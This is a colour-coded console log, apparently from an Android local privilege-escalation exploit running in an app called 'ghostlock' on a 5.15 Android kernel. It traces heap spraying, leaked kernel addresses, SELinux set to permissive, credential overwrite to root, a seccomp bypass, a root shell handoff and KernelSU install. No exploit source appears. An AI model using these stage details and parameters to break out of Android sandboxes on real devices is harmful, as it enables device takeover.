[33m[*] [0mroot script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=5225
[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mruntime verbose_debug=1
[33m[*] [0mdebug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=2000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=16
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=50000
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=200000
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.routes.multicast_waiter.ready_timeout_ms=10000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[33m[*] [0miomem cache: direct_map_end=ffffff8a80000000
[32m[+] [0mstartup context pid=16636 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=1717955 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=16636 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[32m[+] [0mbuild config pid=16636 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=16636 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+1ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+189ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +237ms
[33m[*] [0m[spray] finding futex collisions... +537ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2076ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88064f6c00 +2108ms
[33m[*] [0m[spray] payload ready +2112ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2275ms
[33m[*] [0m[T+2467ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+4476ms]   PI route done
[32m[+] [0mSELinux permissive
[33m[*] [0mW1b: private scratch repair attempt 1/3
[33m[*] [0m=== W1b: private scratch repair === target=0xffffff88064f0108 mode=1 leaf=1
[33m[*] [0m[T+4581ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +247ms
[33m[*] [0m[spray] finding futex collisions... +527ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2035ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8803803c00 +2056ms
[33m[*] [0m[spray] payload ready +2063ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2226ms
[33m[*] [0m[T+6812ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+8821ms]   PI route done
[32m[+] [0mprivate scratch repaired; releasing quarantine
[33m[*] [0m[T+8826ms] Write 1 complete
[33m[*] [0m[T+9037ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff89c594ec00 (143/256 votes)
[33m[*] [0mperf task: 0xffffff89c594ec00 (167/256 votes)
[33m[*] [0m[T+9911ms] perf_find_task done
[33m[*] [0mchild_pid=22118 child_task=0xffffff89c594ec00
[33m[*] [0mvr.ko not loaded; skipping tag clear
[33m[*] [0mW2: cred attempt 1/15
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +246ms
[33m[*] [0m[spray] finding futex collisions... +522ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2015ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8804e18000 +2047ms
[33m[*] [0m[spray] payload ready +2052ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2224ms
[33m[*] [0mW2 fast repair payload prebuilt
[33m[*] [0m=== W2: cred === target=0xffffff89c594f398 mode=2 leaf=0
[33m[*] [0m[T+12357ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +239ms
[33m[*] [0m[spray] finding futex collisions... +505ms
[33m[*] [0m[spray] early collision screen 15/7 at 31%
[33m[*] [0m[spray] futex collisions found +1983ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8809975000 +2015ms
[33m[*] [0m[spray] payload ready +2018ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2198ms
[33m[*] [0m[T+14558ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+16566ms]   PI route done
[33m[*] [0mW2b: firing prebuilt init_cred+8 repair
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0mchild uid = 0
[32m[+] [0mchild is root!
[33m[*] [0mW3: TIF_SECCOMP+mode attempt 1/6
[33m[*] [0m=== W3: TIF_SECCOMP === target=0xffffff89c594ec00 mode=1 leaf=1
[33m[*] [0m[T+17902ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +240ms
[33m[*] [0m[spray] finding futex collisions... +490ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1985ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8812a76000 +2021ms
[33m[*] [0m[spray] payload ready +2027ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2197ms
[33m[*] [0m[T+20105ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+22113ms]   PI route done
[33m[*] [0m=== W3: seccomp mode === target=0xffffff89c594f460 mode=1 leaf=1
[33m[*] [0m[T+22167ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +232ms
[33m[*] [0m[spray] finding futex collisions... +479ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1979ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88118bc400 +2020ms
[33m[*] [0m[spray] payload ready +2025ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2192ms
[33m[*] [0m[T+24366ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+26371ms]   PI route done
[33m[*] [0mseccomp finit_module probe = 0x16
[32m[+] [0mchild seccomp filter bypassed (finit_module errno=22)
[32m[+] [0mchild seccomp fully bypassed (forked workers run filter-free)
[33m[*] [0m[T+28428ms] exploit complete
[33m[*] [0mhandoff: child=22118 alive=1 sent=1 errno=0
[33m[*] [0mhandoff: root script path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mhandoff: root shell worker pid=32742
[33m[*] [0mhandoff: script open fd=3 errno=0 path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0menforce=1 (enforcing)
[32m[+] [0mKernelSU ready
